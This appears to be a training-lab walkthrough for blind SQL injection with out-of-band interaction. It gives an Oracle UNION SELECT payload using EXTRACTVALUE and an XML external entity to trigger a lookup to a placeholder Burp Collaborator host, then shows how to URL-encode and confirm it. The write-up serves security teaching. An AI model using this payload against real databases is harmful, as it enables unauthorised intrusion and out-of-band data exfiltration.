# Lab 16: Blind SQL injection with out-of-band interaction

## Statement

*This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.*

*The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.*

*To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.*

## Walkthrough

We start this lab like any other. We perform different injection tests in different fields but find nothing. We can then try a **DNS lookup**. For this, we will use Burp Collaborator. We will try with the queries provided in the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

Let's first try the query for Oracle databases.

```sql
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

Some characters like `;` and `%` conflict when making the request. To solve this, we can simply URL encode them.

Now all we have to do is replace `BURP-COLLABORATOR-SUBDOMAIN` with our domain. To obtain it, we will go to the `Collaborator` tab and click on `Copy to clipboard`.

![Burp Collaborator](assets/1.png)

After sending the request, we will receive a 200 OK. We must return to the `Collaborator` tab and click on `Poll Now`.

![Poll Now](assets/2.png)

Once this is done, we will see what we have received from the server and we will have completed the lab.

---
<div align="center">
  <a href="../Lab-15/README.md">⬅️ Previous Lab</a>
  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
  <a href="../README.md">Next Lab ➡️</a>
</div>
